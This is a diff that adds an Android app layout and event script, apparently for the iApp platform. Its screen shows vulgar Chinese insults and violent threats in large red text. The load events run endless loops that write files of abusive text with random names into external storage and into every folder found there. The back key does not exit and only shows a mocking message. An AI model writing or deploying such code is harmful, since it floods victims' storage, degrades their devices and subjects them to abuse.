@@ -1,0 +1,66 @@
+<View id="2" did="0" type="LinearLayout">
+<ppt>width=-1
+height=-1
+orientation=vertical
+background=#ff000000</ppt>
+<event></event>
+</View>
+<View id="1" did="2" type="TextView">
+<ppt>width=-2
+height=-2
+text=我操你妈逼\n\n你妈已经被我\n剁成碎尸了
+textColor=#ffff0606
+typeface=@font.ttf
+textSize=60sp
+layout_gravity=center
+layout_marginTop=250dp</ppt>
+<event></event>
+</View>
+<UIEventset><eventItme type="loading">t()
+{
+  s b = "打开的时候你妈已经被剁成碎尸了"
+  s c = "/storage/emulated/0/我草泥马逼"
+  s uu = 1
+  w(true)
+  {
+    sran(1, 10000, a)
+    ss(c+a+uu,bn)
+    fw(bn,b)
+    s+(1,uu)
+  }
+}
+
+t()
+{
+  stop(25)
+  uigo("sb.iyu")
+}</eventItme><eventItme type="loadingComplete">
+t()
+{
+  s js="1"
+  s a = "/storage/emulated/0/"
+  w(true)
+  {
+    fl(a,true,b)
+    for(c; b)
+    {
+      fw("/storage/emulated/0/"+c+"/你妈死了"+js,"你妈死了操尼玛逼")
+      s+(1,js)
+    }
+  }
+}</eventItme><eventItme type="downkey">f(st_kC==4)
+{
+  f(sss.exit==null)
+  {
+    sss exit=0
+    fn tw.tw("你妈死了哈哈哈",1)
+    t()
+    {
+      stop(2000)
+      sss exit=null
+    }
+  }
+  else
+  {
+  }
+}</eventItme></UIEventset>
